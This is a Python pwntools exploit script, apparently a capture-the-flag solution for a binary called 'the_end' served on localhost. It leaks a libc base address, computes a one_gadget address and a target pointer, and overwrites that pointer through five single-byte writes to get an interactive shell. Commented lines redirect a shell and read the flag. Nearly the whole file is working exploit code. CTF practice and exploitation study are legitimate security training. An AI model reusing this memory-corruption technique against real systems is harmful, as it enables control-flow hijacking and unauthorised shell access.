#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import re
import sys
context.binary = "./the_end"
#  context.log_level = 'debug'

#  io = process("./the_end")
io = remote("127.0.0.1", 9999)
libc = ELF("./libc64.so")
libc.sym['one_gadget'] = 0xf02a4
#  libc.sym['one_gadget'] = 0x4526a
#  libc.sym['one_gadget'] = 0xf1147
#  libc.sym['one_gadget'] = 0x45216

raw_input("DEBUG: ")
io.recvuntil("gift ")
libc.address = int(io.recvuntil(",", drop = True), 16) - libc.sym['sleep']
io.recvuntil("good luck ;)")
success("libc -> {:#x}".format(libc.address))
target = libc.address + 0x5f0f48
success("target -> {:#x}".format(target))
success("one_gadget -> {:#x}".format(libc.sym['one_gadget']))

pause()
for i in xrange(5):
    io.send(p64(target + i))
    sleep(0.01)
    io.send(p64(libc.sym['one_gadget'])[i])
    sleep(0.01)

#  pause()
context.log_level = "debug"
#  io.sendline("exec /bin/sh 1>&0\0")
#  io.sendline("cat flag >&0")

io.interactive()
